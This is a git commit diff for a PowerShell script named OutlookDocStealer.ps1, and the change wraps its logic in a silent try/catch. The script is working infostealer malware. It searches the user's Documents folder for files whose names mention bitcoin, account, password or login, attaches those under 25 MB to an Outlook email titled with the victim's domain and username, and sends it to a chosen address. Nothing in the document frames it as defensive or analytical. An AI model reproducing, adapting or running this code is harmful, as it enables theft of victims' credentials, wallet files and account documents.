9ced5127b745ef435b4885871056168d4cd9c343
Jeff Bowie <jeffjbowie@gmail.com>
2021-02-02 10:31:38 -0600

    Update OutlookDocStealer.ps1

--- OutlookDocStealer.ps1
+++ OutlookDocStealer.ps1
@@ -2,40 +2,42 @@
 $Outlook = New-Object -ComObject Outlook.Application
 function Vicious ($SendTo) {
 	
-	$Mail = $Outlook.CreateItem(0)
-	$Mail.Importance = 2
-	$Mail.To = "" + $SendTo
-	$Mail.Subject = $env:userdomain + "\" + $env:username
-	$Mail.HTMLBody = ""
-	
-	$files = Get-ChildItem $env:userprofile\Documents
-	for ($i=0; $i -lt $files.Count; $i++) {
-	
-		if ($files[$i].name.tolower() -match "bitcoin") {
-			if ( $files[$i].Length/1MB -lt 25 ) {
-				$Mail.Attachments.Add($files[$i].fullname) | Out-Null
+	try {
+		$Mail = $Outlook.CreateItem(0)
+		$Mail.Importance = 2
+		$Mail.To = "" + $SendTo
+		$Mail.Subject = $env:userdomain + "\" + $env:username
+		$Mail.HTMLBody = ""
+
+		$files = Get-ChildItem $env:userprofile\Documents
+		for ($i=0; $i -lt $files.Count; $i++) {
+
+			if ($files[$i].name.tolower() -match "bitcoin") {
+				if ( $files[$i].Length/1MB -lt 25 ) {
+					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
+				}
+			}
+			elseif  ($files[$i].name.tolower() -match "account") {
+				if ( $files[$i].Length/1MB -lt 25 ) {
+					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
+				}
+			}
+			elseif  ($files[$i].name.tolower() -match "password") {
+				if ( $files[$i].Length/1MB -lt 25 ) {
+					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
+				}
+			}
+			elseif  ($files[$i].name.tolower() -match "login") {
+				if ( $files[$i].Length/1MB -lt 25 ) {
+					$Mail.Attachments.Add($files[$i].fullname) | Out-Null
+				}
 			}
 		}
-		elseif  ($files[$i].name.tolower() -match "account") {
-			if ( $files[$i].Length/1MB -lt 25 ) {
-				$Mail.Attachments.Add($files[$i].fullname) | Out-Null
-			}
-		}
-		elseif  ($files[$i].name.tolower() -match "password") {
-			if ( $files[$i].Length/1MB -lt 25 ) {
-				$Mail.Attachments.Add($files[$i].fullname) | Out-Null
-			}
-		}
-		elseif  ($files[$i].name.tolower() -match "login") {
-			if ( $files[$i].Length/1MB -lt 25 ) {
-				$Mail.Attachments.Add($files[$i].fullname) | Out-Null
-			}
-		}
+		$Mail.Send()
+
+		Start-Sleep -s 7
+		$Outlook.Quit
+		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
 	}
-	$Mail.Send()
-
-	Start-Sleep -s 7
-	$Outlook.Quit
-	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
-
+	catch {}
 }
